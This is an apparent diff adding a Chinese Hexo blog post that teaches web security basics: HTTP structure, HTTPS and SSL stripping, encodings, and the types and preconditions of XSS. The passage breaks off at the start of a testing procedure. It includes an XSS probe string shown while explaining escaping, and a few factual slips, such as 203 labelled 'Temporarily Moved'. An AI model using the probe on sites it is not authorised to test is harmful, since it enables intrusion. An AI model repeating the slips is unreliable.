@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>http与xss |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-http与xss"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  http与xss
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/06/10/http%E4%B8%8Exss/" class="article-date">
+  <time datetime="2023-06-10T01:12:30.000Z" itemprop="datePublished">2023-06-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E3%80%8AWEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E3%80%8B/">《WEB安全基础》</a> / <a class="article-category-link" href="/categories/%E3%80%8AWEB%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E3%80%8B/xss/">xss</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">11.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">42 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="一、web安全基础"><a href="#一、web安全基础" class="headerlink" title="一、web安全基础"></a>一、web安全基础</h1><h2 id="1-web应用"><a href="#1-web应用" class="headerlink" title="1.web应用"></a>1.web应用</h2><h3 id="1-HTTP请求与响应"><a href="#1-HTTP请求与响应" class="headerlink" title="1.HTTP请求与响应"></a>1.HTTP请求与响应</h3><p>（PC）访问网址-&gt;发起请求（HTTP请求包头结构）-&gt;（服务器）接收并回应请求-&gt;HTTP响应-&gt;（HTTP响应包头结构）-&gt;得到页面</p>
+<p>请求包与响应包不陌生了，bp抓一下就有。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616203032474.png" alt="信息查询功能流程"></p>
+<p>1）Web应用不一定为用户可见页面，比如各类API接口，其原理是一个Web页面，并对用户请求的内容进行处理。</p>
+<p>2）Web应用不一定要依托浏览器才能使用，例如，爬虫脚本的数据获取部分，只要能构造HTTP Request包即可开展对Web应用数据的获取。</p>
+<p>3）并不一定需要标准的Web中间件，直接利用编程语言编写对应处理规则也可实现对用户请求的处理，但处理的过程就是中间件本来该执行的工作。</p>
+<h3 id="2-web应用环境"><a href="#2-web应用环境" class="headerlink" title="2.web应用环境"></a>2.web应用环境</h3><p>Web应用需要一台服务器提供基础资源，可运行操作系统，并配合中间件来为用户提供服务。如果站点功能较为复杂，那么还需要用数据库提供基础的数据存储支持，用文件服务器进行备份，用SAN系统提供高性能的文件存储等。在这个过程中，任何一个环节出现问题，都可能导致Web安全问题出现。</p>
+<h3 id="3-交互"><a href="#3-交互" class="headerlink" title="3.交互"></a>3.交互</h3><p>HTTP协议作为Web应用的基础协议，其特点就是用户请求–服务器响应。在这个过程中，服务器一直处于被动响应状态，无法主动获取用户的信息。再看一下HTML结构，服务器在完成用户响应后，当前的HTML页面会被发送到用户端的浏览器，这也就决定了客户端拥有HTML的全部结构及内容。基于这种交换环境，在客户端可篡改任何请求参数，服务器必须对请求内容进行响应。这也就决定了Web最核心的问题，用户端的所有行为均不可信。</p>
+<h2 id="2-Http协议"><a href="#2-Http协议" class="headerlink" title="2.Http协议"></a>2.Http协议</h2><h3 id="1-定义与特点"><a href="#1-定义与特点" class="headerlink" title="1.定义与特点"></a>1.定义与特点</h3><p>HTTP是一个应用层的面向对象的协议</p>
+<blockquote>
+<p>其特点有三：</p>
+<ol>
+<li>无状态，客户端发起请求-&gt;服务端响应-&gt;发出新请求，每次请求均为独立行为，体现了HTTP无状态特点</li>
+<li>支持B&#x2F;S模式，有浏览器即可工作，用户可上手易于操作</li>
+<li>灵活性好，数据传输、视频播放、交互</li>
+</ol>
+</blockquote>
+<h3 id="2-HTTP请求内容"><a href="#2-HTTP请求内容" class="headerlink" title="2.HTTP请求内容"></a>2.HTTP请求内容</h3><p>HTTP请求由三部分组成，分别是请求行、消息报头、请求正文。</p>
+<blockquote>
+<p>GET &#x2F;ad&#x2F;json&#x2F;integrate&#x2F;list?positions&#x3D;932 HTTP&#x2F;1.1<br><strong>Host</strong>: kunpeng.csdn.net<br>Connection: close<br>sec-ch-ua: “Chromium”;v&#x3D;”112”, “Google Chrome”;v&#x3D;”112”, “Not:A-Brand”;v&#x3D;”99”<br><strong>Accept:</strong> application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01<br><strong>Content-Type</strong>: application&#x2F;x-www-form-urlencoded; charset&#x3D;utf-8<br>sec-ch-ua-mobile: ?0<br><strong>User-Agent</strong>: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;112.0.0.0 Safari&#x2F;537.36<br>sec-ch-ua-platform: “Windows”<br><strong>Origin</strong>: <a target="_blank" rel="noopener" href="https://www.csdn.net/">https://www.csdn.net</a><br>Sec-Fetch-Site: same-site<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Dest: empty<br><strong>Referer</strong>: <a target="_blank" rel="noopener" href="https://www.csdn.net/">https://www.csdn.net/</a><br><strong>Accept-Encoding</strong>: gzip, deflate<br><strong>Accept-Language</strong>: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Cookie: uuid_tt_dd&#x3D;10_37087154240-1640528249…..</p>
+</blockquote>
+<p><strong>1.请求行</strong></p>
+<p>标准的请求行格式为：</p>
+<blockquote>
+<p>请求方法 请求URI 协议版本 回车换行</p>
+</blockquote>
+<p>嗯，就bp抓包时的第一行</p>
+<p><strong>请求方法统计一下</strong></p>
+<blockquote>
+<p>·GET　请求获取Request-URI所标识的资源。</p>
+<p>·POST　在Request-URI所标识的资源后附加新的数据。</p>
+<p>·HEAD　请求获取由Request-URI所标识的资源的响应消息报头。</p>
+<p>·PUT　请求服务器存储一个资源，并用Request-URI作为其标识。</p>
+<p>·DELETE　请求服务器删除Request-URI所标识的资源。</p>
+<p>·TRACE　请求服务器回送收到的请求信息，主要用于测试或诊断。</p>
+<p>·CONNECT　保留，将来使用。</p>
+<p>·OPTIONS　请求查询服务器的性能，或者查询与资源相关的选项和需求。</p>
+<p>在实际应用中，考虑到安全因素，主要使用GET和POST两种方式开展请求。例如，早期ASP系统中存在大量IIS PUT漏洞，导致攻击者可直接利用PUT工具上传木马以获得Webshell。因此，从安全及业务开展统一的角度，其余方式目前基本都不再使用。</p>
+<p>GET和POST在使用中的主要区别为：</p>
+<p>·GET方法　通过在浏览器的地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，对应的请求行示例为：GET&#x2F;form.html HTTP&#x2F;1.1（CRLF）。</p>
+<p>·POST方法　要求被请求服务器接收附在请求后面的数据，常用于提交表单。</p>
+</blockquote>
+<p><strong>2.消息报头</strong></p>
+<blockquote>
+<p>·Host（必须存在）：Host主要用于指定被请求资源的Internet主机和端口号，即标识请求目标。其来源为当前访问的URL。缺省端口号为80，若指定了端口号（以8000为例）进行防卫，则变成Host： kunpeng.csdn.net:8000。</p>
+<p>·Content-Length：标识当前请求包中的内容长度。</p>
+<p>·Origin：用来标识本次请求的发起源，只适用于POST方式。</p>
+<p>·Referer：用来标识当前请求的发起页面。</p>
+<p>·Accept：Accept用于指定客户端接收哪些类型的信息。上例中表明允许后续类型在客户端实现。</p>
+<p>·Accept-Encoding：告知服务器端当前客户端可接受的内容编码。</p>
+<p>·Accept-Language：告知服务器端支持的语言类型。</p>
+<p>·User-Agent：User-Agent通常简称为UA，其中包含当前用户的操作系统、浏览器的基本信息，用于告知Web服务器当前访问者的情况。此报头域不是必需存在的。但如果客户端不使用User-Agent请求报头域，那么服务器端就无法得知客户端的基本信息。目前UA也经常被Web服务器用于统计当前用户状态及行为。</p>
+</blockquote>
+<p><strong>3.请求正文</strong></p>
+<blockquote>
+<p>Sec-Fetch-Dest: document<br>Referer: <a target="_blank" rel="noopener" href="http://localhost:81/7/1.html">http://localhost:81/7/1.html</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Connection: close</p>
+<p><strong>username&#x3D;123&amp;pwd&#x3D;546&amp;%26%2365533%3B%26%2365533%3B%E4%BA%26%2365533%3B&#x3D;%C4%F3%B8%F2</strong></p>
+<p>黑粗体部分为请求正文内容</p>
+</blockquote>
+<p>注意，get请求没有这一项，因为在url就包含了</p>
+<p>当然了，防止攻击的话，post的请求参数不要这么大众化。</p>
+<h3 id="3-HTTP响应内容"><a href="#3-HTTP响应内容" class="headerlink" title="3.HTTP响应内容"></a>3.HTTP响应内容</h3><p>响应行、响应消息报头、响应正文</p>
+<p>重点说下常见的响应消息报头：</p>
+<blockquote>
+<p>·Server　Server响应报头域包含服务器用来处理请求的软件信息。参考图1-6，其中定义了Server：Apache，用来告知用户端提供本次响应的服务器端采用的中间件是Apache。可以看到，在响应包中Server信息与请求包中User-Agent信息的作用非常类似，都是将自身的版本告知对方。</p>
+<p>·X-Powered-By　用来标识实现当前Web站点所采用的语言及版本号。</p>
+<p>·Set-cookie　根据响应包生成Cookie，并提供给客户端。</p>
+<p>·Content-Length　与请求包中的用法相同，用以标识当前响应包中的内容长度。</p>
+</blockquote>
+<p>其响应正文内容呢，一般携带当前页面源码，在安全方面无需关注。</p>
+<p>常见状态代码及状态描述：</p>
+<blockquote>
+<p>·200：OK，客户端请求成功。</p>
+<p>·301：Permanently Moved，页面重定向。</p>
+<p>·203：Temporarily Moved，页面临时重定向。</p>
+<p>·400：Bad Request，客户端请求有语法错误，不能被服务器所理解。</p>
+<p>·401：Unauthorized，请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用。</p>
+<p>·403：Forbidden，服务器收到请求，但是拒绝提供服务。</p>
+<p>·404：Not Found，请求资源不存在，或者请求无法实现。</p>
+<p>·500：Internal Server Error，服务器发生不可预期的错误。</p>
+<p>·503：Server Unavailable，服务器当前不能处理客户端的请求，一段时间后可能恢复正常。</p>
+</blockquote>
+<h3 id="4-URL"><a href="#4-URL" class="headerlink" title="4.URL"></a>4.URL</h3><p>协议+IP+端口(80省略呗)+路径+参数</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.neat-reader.cn/webapp#/epubreader?bookguid=682">https://www.neat-reader.cn/webapp#/epubreader?bookguid=682</a></p>
+</blockquote>
+<h2 id="3-HTTPS协议"><a href="#3-HTTPS协议" class="headerlink" title="3.HTTPS协议"></a>3.HTTPS协议</h2><p>HTTP的话，在登录页面上提交账户密码，用wireshark抓取该行为，可以清晰地看到用户当前的行为，包括用户的登录情况、用户名和密码、访问地址等。</p>
+<p>所以引出HTTPS</p>
+<h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p>HTTPS并不是一个独立的协议，而是工作在SSL协议上的HTTP协议。SSL（Secure Sockets Layer，安全套接层）是一种为网络通信提供安全及数据完整性的安全协议。当然后续有TLS了，算是对SSL的拓展。</p>
+<p>在HTTPS传输过程中有两个核心的问题将直接影响用户的数据安全：</p>
+<p>1）如何建立安全的传输通道：加密方式</p>
+<p>2）如何确认双方的身份：CA认证中心的权威</p>
+<h3 id="2-HTTPS单向认证"><a href="#2-HTTPS单向认证" class="headerlink" title="2.HTTPS单向认证"></a>2.HTTPS单向认证</h3><blockquote>
+<p>1）客户端向服务器发起请求，其中包含各种SSL参数，并从服务器端拿到证书。</p>
+<p>2）客户端将从服务器端获得的证书提交至CA，CA验证该证书的合法性并告知客户端，客户端根据CA验证结果来确认目标站点的真实性。</p>
+<p>3）从服务器端的证书中取出公钥，利用公钥对客户端产生的密钥加密（对称密钥），并利用公钥将加密后的密钥发送到服务器端。</p>
+<p>4）服务器端用其私钥解密出数据，即得到客户端发送来的对称密钥，之后均利用这个对称密钥对传输文件进行加密&#x2F;解密。</p>
+</blockquote>
+<p>单向认证的特点在于只有客户端对服务器端进行了身份验证，而服务器只是对提交过来的加密密钥进行识别并处理，而不对客户端的合法性进行验证。这就造成了遭受SSL剥离攻击的隐患。</p>
+<h4 id="SSL剥离攻击"><a href="#SSL剥离攻击" class="headerlink" title="SSL剥离攻击"></a>SSL剥离攻击</h4><p>SSL剥离攻击是针对HTTPS单向认证环境的攻击手段。例如，SSL Strip工具的原理就是劫持用户的请求，并模拟用户来与目标站点建立HTTPS连接。成功连接后利用已建立连接的对称密钥解密服务器发送过来的HTTPS，将其中的HTTP再发送给客户端</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616221327435.png" alt="SSL剥离攻击流程"></p>
+<p>故HTTPS重点是解决传输过程中链路被劫持的风险，针对Web系统的安全防护效果有限。</p>
+<h3 id="3-HTTPS双向认证"><a href="#3-HTTPS双向认证" class="headerlink" title="3.HTTPS双向认证"></a>3.HTTPS双向认证</h3><blockquote>
+<p>1）客户端向服务器发起请求，其中包含各种SSL参数，并从服务器端拿到证书。</p>
+<p>2）客户端将从服务器端获得的证书提交至CA，CA验证该证书的合法性并告知客户端，客户端根据CA验证结果来确认目标站点的真实性。在这里新增了两个步骤：</p>
+<p>①服务器端要求客户端发送证书并验证，并接受用户的公钥。</p>
+<p>②双方利用对方公钥加密来协商可支持的传输类型及密码方案。</p>
+<p>3）客户端从服务器端的证书中取出公钥，利用公钥对客户端产生的密钥加密（对称密钥），并利用公钥将加密后的密钥发送到服务器端。</p>
+<p>4）服务器端用私钥解密出数据，即得到客户端发送来的对称密钥，之后所有内容均利用这个对称密钥对传输文件进行加密&#x2F;解密。</p>
+</blockquote>
+<p>该认证方式增加了服务器对客户端的合法性校验，这样可有效避免SSL剥离攻击。但由于会要求密钥生成(安装密钥生成插件)，需要让用户有额外操作，不适用于全部场景。</p>
+<h3 id="4-HTTPS特点"><a href="#4-HTTPS特点" class="headerlink" title="4.HTTPS特点"></a>4.HTTPS特点</h3><p>·HTTPS并没有改变HTTP协议本身的特性，只是在传输过程中利用SSL&#x2F;TLS技术进行加密，保障传输过程中的安全。</p>
+<p>·HTTPS技术可有效保障用户信息不被泄露，避免上网行为设备、代理类设备对用户当前行为的获取，并且可有效避免来自运营商层面的TCP劫持。</p>
+<p>·HTTPS主要防护传输过程中的安全，如果在用户端利用Burpsuite，则依然可以通过代理技术实现对Web访问的劫持，因此并不会有效提升服务器的安全性。</p>
+<p>HTTPS重点解决的是<strong>传输过程</strong>中的安全问题，可用来保障客户端的传输数据安全，并不会直接提升Web站点的安全性。Web安全的问题仍要从功能角度出发，找到问题根源，方可有效解决。</p>
+<h2 id="4-编码加密"><a href="#4-编码加密" class="headerlink" title="4.编码加密"></a>4.编码加密</h2><p><strong>针对字符的编码</strong></p>
+<blockquote>
+<p>1.ASCII编码</p>
+<p>2.DBCS（Double Byte Charecter Set，双字节字符集）:</p>
+<p>GB2312、GBK和GB18030等中文编码</p>
+</blockquote>
+<p><strong>传输过程的编码</strong></p>
+<p>一般在HTML中，利用“&#x2F;”“？”“&amp;”等符号实现针对特定字符的内容定义。如果url的参数中也有这些字符，需要编码避免产生影响</p>
+<h3 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1.URL编码"></a>1.URL编码</h3><blockquote>
+<p>URL中只允许包含英文字母（a～z、A～Z）、数字（0～9）、4个特殊字符（-、_、.、~）以及所有保留字符。在实际Web应用中，所使用的字符不只在这个范围内，如用户输入参数中还带有单引号、百分号、中文等。因此，需要对URL中的非允许字符进行编码。</p>
+<p>主体采用的是ASCII编码表，编码方式是用%（百分号）加上两位字符代表一个字节。</p>
+<p>例如，单引号在ASCII中的<strong>十六进制</strong>编码为27，在URL编码中就是%27。</p>
+<p>对于中文字符，会先确认当前页面所用的编码格式。如果当前页面使用UTF-8编码，则会先将中文字符转换成UTF-8编码，然后在每个字符的每一组编码前添加%，这样就完成URL编码。</p>
+</blockquote>
+<p>例如：</p>
+<blockquote>
+<p>·URL编码前</p>
+<p><a target="_blank" rel="noopener" href="http://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&passwd=ww121%25$">HTTP://172.29.152.23/loginPage.jsp?name=测试&amp;passwd=ww121%$</a></p>
+<p>·URL编码后</p>
+<p><a target="_blank" rel="noopener" href="http://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&passwd=ww121%25$">HTTP://172.29.152.23/loginPage.jsp?name=%E6%B5%8B%E8%AF%95&amp;passwd=ww121%25$</a></p>
+</blockquote>
+<p>假设当前页面为UTF-8编码。可以看到，URL编码里针对参数“ww121%$”中的“%”进行了编码，编码结果为“%25”。针对中文字符“测试”，URL编码(<strong>十六进制</strong>)为“%E6%B5%8B%E8%AF%95”。再查询“测试”字符的UTF-8编码，其十六进制编码就是“E6B58B E8AF95”。</p>
+<h3 id="2-base64编码"><a href="#2-base64编码" class="headerlink" title="2.base64编码"></a>2.base64编码</h3><p>其原理是将3个8bit字节（3<em>8&#x3D;24）转化为4个6bit的字节（4</em>6&#x3D;24）。因此，Base64编码的特点是编码后的字节数<strong>是4的倍数</strong>，如果不足4bit则用等号（&#x3D;）等进行填充。<strong>它含有大小写字母及+、-、&#x3D;等符号</strong>。</p>
+<p>例如：</p>
+<blockquote>
+<p>·编码前：base64编码</p>
+<p>·编码后：YmFzZTY057yW56CB（十六位）</p>
+<p>·编码前：base64编码1测试</p>
+<p>·编码后：YmFzZTY057yW56CBMea1i+ivlQ&#x3D;&#x3D;</p>
+</blockquote>
+<h3 id="3-HTML字符实体"><a href="#3-HTML字符实体" class="headerlink" title="3.HTML字符实体"></a>3.HTML字符实体</h3><p>表示HTML中危险字符的方案，也是解决跨站脚本（XSS）攻击的有效手段。</p>
+<p>HTML字符实体的特点是以&amp;开头，并以分号结尾。例如，“&lt;”的编码是“&amp;lt；”。</p>
+<p>比如防范xss攻击时，</p>
+<p>xss语句:<code>&lt;script&gt;alert（/xss/）&lt;/script&gt;</code></p>
+<p>当用户提交的参数为xss语句时，经过HTML字符实体处理后，可得到“&amp;lt；script&amp;gt；alert（&#x2F;xss&#x2F;）&amp;lt；&#x2F;script&amp;gt；”。这样就解决了危险字符的显示问题。</p>
+<h3 id="4-Web系统中的加密措施"><a href="#4-Web系统中的加密措施" class="headerlink" title="4.Web系统中的加密措施"></a>4.Web系统中的加密措施</h3><p>标准的加密方法是对用户提交的参数（如密码、特定内容等）进行加<strong>密后再传输</strong>，避免参数在传输过程中被劫持，导致用户数据丢失。当数据传输到Web服务器，将参数解密后处理。这个过程中存在两种情况。</p>
+<h4 id="1-不需要服务器知道明文的内容"><a href="#1-不需要服务器知道明文的内容" class="headerlink" title="1.不需要服务器知道明文的内容"></a>1.不需要服务器知道明文的内容</h4><p>常见于用户的隐私信息，如用户密码。Web系统在存储用户密码时不会直接存储密码明文，而是预先设定加密算法，将用户的隐私信息加密后存储在数据库中。这样可在系统运维过程中避免管理人员直接观察并获取用户的密码信息。这种情况下，经常利用MD5&#x2F;SHA-1实现加密。</p>
+<blockquote>
+<p>MD5&#x2F;SHA-1是一种信息摘要算法，可将任意长度的明文内容转换成长度固定的密文，并且针对信息摘要的过程不可逆，但针对相同内容每次执行算法得到的密文完全相同。</p>
+</blockquote>
+<p>Web系统存储的内容就是经过MD5&#x2F;SHA-1转换后的密文。因此用户在客户端利用MD5&#x2F;SHA-1将转换后的密文传输到Web系统，Web系统再将<strong>用户密文与数据库中的密文进行比对</strong>即可。</p>
+<p>当然，由于大量彩虹表（存储明文与密文的表）存在，可间接实现密码破解的效果。</p>
+<p>此外，MD5&#x2F;SHA-1存在碰撞问题，即存在<strong>不同明文</strong>利用MD5或SHA-1计算之后得到的<strong>密文完全相同</strong>。</p>
+<h4 id="2-需要服务器知道明文的内容"><a href="#2-需要服务器知道明文的内容" class="headerlink" title="2.需要服务器知道明文的内容"></a>2.需要服务器知道明文的内容</h4><p>客户端发起的请求中包含了大量需要服务器处理的内容，如订单信息、留言等。由于HTTP协议在传输过程中并不会对其中的内容加密，就会导致在传输过程中内容被抓包。</p>
+<p>在传输过程中，加密的最大意义还是避免内容泄漏。</p>
+<p>由于成本问题，https不是免费的哈，多数大型站点仍然会采用HTTP进行业务开展。</p>
+<p>要在HTTP下保障传输安全，可利用对称加密措施进行实现，如AES方式等。但Web站点始终在用户浏览器上，那么相对应的加密算法也处于公开状态，所以<strong>算法越复杂越好</strong>，此外还要<strong>降低加密传参的数量</strong></p>
+<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>http请求&#x2F;响应包结构、http与https、编码加密</p>
+<h1 id="二、网络攻击"><a href="#二、网络攻击" class="headerlink" title="二、网络攻击"></a>二、网络攻击</h1><p>基础攻击是攻击者将攻击代码通过各种方式<strong>嵌入到现有Web系统中</strong>，造成Web系统在执行的时候，嵌入的攻击代码使Web系统原有功能结构发生改变，进而导致安全漏洞的出现。</p>
+<h2 id="1-xss攻击"><a href="#1-xss攻击" class="headerlink" title="1.xss攻击"></a>1.xss攻击</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>XSS攻击（Cross Site Scripting，跨站脚本攻击），也叫做html&#x2F;js注入攻击。</p>
+<blockquote>
+<p>是指攻击者利用网站程序对用户输入过滤不足的缺陷，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p>
+</blockquote>
+<blockquote>
+<p>XSS攻击主要影响的是用户端的安全，包含用户信息安全、权限安全等。并且多数XSS攻击都依赖于JavaScript脚本开展。</p>
+</blockquote>
+<h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><blockquote>
+<p>将恶意脚本嵌入到当前网页中并执行的攻击方式</p>
+</blockquote>
+<h3 id="3-原因"><a href="#3-原因" class="headerlink" title="3.原因"></a>3.原因</h3><blockquote>
+<p>主要原因是网站对于用户提交的数据过滤不严格，导致用户提交的数据可以修改当前页面或者插入了一段脚本。</p>
+<p>网站一般具有用户输入参数功能，如网站留言板、评论处等。攻击者利用其用户身份在输入参数时附带了恶意脚本，在提交服务器之后，服务器没有对用户端传入的参数做任何安全过滤。之后服务器会根据业务流程，将恶意脚本存储在数据库中或直接回显给用户。在用户浏览含有恶意脚本的页面时，恶意脚本会在用户浏览器上成功执行。恶意脚本有很多种表现形式，如常见的弹窗、窃取用户Cookie、弹出广告等，这也是跨站攻击的直接效果。</p>
+</blockquote>
+<h3 id="4-涉及风险功能点"><a href="#4-涉及风险功能点" class="headerlink" title="4.涉及风险功能点"></a>4.涉及风险功能点</h3><h5 id="1-评论"><a href="#1-评论" class="headerlink" title="1.评论"></a>1.评论</h5><p>用户输入评论（评论处为攻击代码）→服务器接收到评论并存储（入库存储）→前台自动调用评论→任何人触发评论（直接看到攻击代码）→攻击成功</p>
+<h5 id="2-私信"><a href="#2-私信" class="headerlink" title="2.私信"></a>2.私信</h5><p>用户发送私信（私信内夹带攻击代码）→服务器接收私信并存储（入库处理）→收信用户打开私信（展示攻击代码）→攻击成功。</p>
+<p>XSS攻击的目标为<strong>打开已经嵌入XSS攻击代码网页的用户</strong>。用户的身份类型各不相同。根据身份特点，重点需要保障的用户信息为：</p>
+<p>1）网站的管理员账号信息。</p>
+<p>2）网站用户的账号信息及特权、金额等。</p>
+<p>3）活跃账号的信息。</p>
+<h3 id="5-XSS攻击分类"><a href="#5-XSS攻击分类" class="headerlink" title="5.XSS攻击分类"></a>5.XSS攻击分类</h3><p>根据攻击代码的存在地点及是否被服务器存储，并且根据XSS攻击存在的形式及产生的效果，可以将其分为以下三类。</p>
+<blockquote>
+<p>1）反射型跨站攻击：涉及浏览器—服务器交互。</p>
+<p>将用户输入的数据通过URL的形式直接或未经过完善的安全过滤就在浏览器中进行输出，会导致输出的数据中存在可被浏览器执行的代码数据。</p>
+<p>因为一般出现在URL中，因此黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使攻击成功实施。</p>
+</blockquote>
+<blockquote>
+<p>2）存储型跨站攻击：涉及浏览器—服务器—数据库交互；</p>
+<p>指Web应用程序将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示。</p>
+<p>危害最广；实现偷取用户Cookie、进行内网探测、弹出广告等行为。</p>
+<p>为常见的场景就是在博客或新闻发布系统中，黑客将包含恶意代码的数据信息直接写入文章或文章评论中，所有浏览文章或评论的用户就会被黑客在他们的客户端浏览器环境中执行插入的恶意代码。</p>
+</blockquote>
+<blockquote>
+<p>3）DOM型跨站攻击：涉及浏览器—服务器交互。</p>
+<p>其从效果上来说也算是反射型XSS。但是这种XSS实现方法比较特殊，是由<strong>JavaScript的DOM节点编程</strong>可以改变HTML代码这个特性而形成的XSS攻击。</p>
+<p>基于DOM的XSS攻击往往需要针对具体的JavaScript DOM代码进行分析，并根据实际情况进行XSS攻击的利用。</p>
+<p>实际上构造难度较大，比较少见。</p>
+</blockquote>
+<h3 id="6-攻击条件"><a href="#6-攻击条件" class="headerlink" title="6.攻击条件"></a>6.攻击条件</h3><p>反射型&#x2F;DOM型跨站攻击均可以理解为：</p>
+<p>服务器接收到数据，并原样返回给用户，整个过程中Web应用并没有自身的存储过程（存入数据库）。这也就导致了攻击无法持久化，仅针对当次请求有效，也就无法直接攻击其他用户。</p>
+<p>当然，这两类攻击也可利用钓鱼、垃圾邮件等手段产生攻击其他用户的效果。但是需在社会工程学的配合下执行。随着目前浏览器的各类过滤措施愈发严格，在实战过程中这类攻击的成功率、效果及危害程度均不高。但我们仍需关注这类风险。</p>
+<h4 id="例子（存储型）"><a href="#例子（存储型）" class="headerlink" title="例子（存储型）"></a><strong>例子（存储型）</strong></h4><p>假设攻击者要想成功实施跨站脚本攻击，那么必须对业务流程进行了解。</p>
+<p>流程如下：</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230616232445592.png" alt="业务流程"></p>
+<p>业务流程关键点分析：</p>
+<p>1）入库处理：攻击脚本需存储在数据库中，可供当前应用的使用者读取。</p>
+<p>2）出库处理：由当前功能的使用者按照正常的业务流程从数据库中读取信息，这时攻击脚本即开始执行。</p>
+<p>再对攻击进行分析，并结合XSS攻击的特性可知，XSS攻击成功必须要满足<strong>以下四个条件：</strong></p>
+<blockquote>
+<p>（1）入库处理</p>
+<p>1）目标网页有攻击者可控的输入点。</p>
+<p>2）输入信息可以在受害者的浏览器中显示。</p>
+<p>3）输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过。</p>
+<p>（2）出库处理</p>
+<p>浏览器将输入解析为脚本，并具备执行该脚本的能力。</p>
+</blockquote>
+<p>实现一个XSS存储型跨站攻击，以上四点缺一不可。</p>
+<p><strong>当然，防护的话，只需破坏上述任意一个条件。</strong></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>从防护角度，可以选择<strong>禁止攻击脚本存储</strong>在数据库，即在入库时做处理；或者对攻击脚本进行<strong>转义</strong>，避免出库时顺利执行。满足以上两种条件中的任何一个即可实现有效的防护。</p>
+<h3 id="7-XSS漏洞发现"><a href="#7-XSS漏洞发现" class="headerlink" title="7.XSS漏洞发现"></a>7.XSS漏洞发现</h3><h4 id="1-基本测试流程"><a href="#1-基本测试流程" class="headerlink" title="1.基本测试流程"></a>1.基本测试流程</h4><p>对于存储型跨站漏洞。这主要取决于可能含有XSS漏洞的业务流程针对用户参数的<strong>过滤程度</strong>或者当前的<strong>防护手段</strong>。由于XSS漏洞最终<strong>仍需业务使用者浏览</strong>后方可触发执行，导致某些后台场景<strong>需要管理员触发</strong>后方可发现。因此，漏洞是否存在且可被利用，很多时候需要较长的时间才会得到结果。</p>
+<p>常见的web漏洞扫描器可以扫出反射型xss漏洞，但仍有误报的可能，需要人工检验。存储型跨站攻击必须由用户触发才能被发现。如果用户一直不触发，则漏洞无法检查出来。</p>
+<p>漏洞标准挖掘流程：</p>
+<blockquote>
